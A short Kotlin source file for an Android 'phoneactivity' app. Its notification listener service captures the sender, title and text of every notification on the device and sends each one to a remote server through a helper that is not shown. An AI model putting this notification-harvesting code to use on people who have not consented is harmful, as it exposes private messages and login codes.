package com.example.phoneactivity

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log

class NotificationMonitorService : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName
        val extras = sbn.notification.extras
        val title = extras.getCharSequence("android.title")?.toString()
        val text = extras.getCharSequence("android.text")?.toString()

        val msg = "📩 From: $pkg | Title: $title | Text: $text"
        Log.i("NotificationMonitor", msg)
        NetworkHelper.sendLogToServer(msg)
    }
}
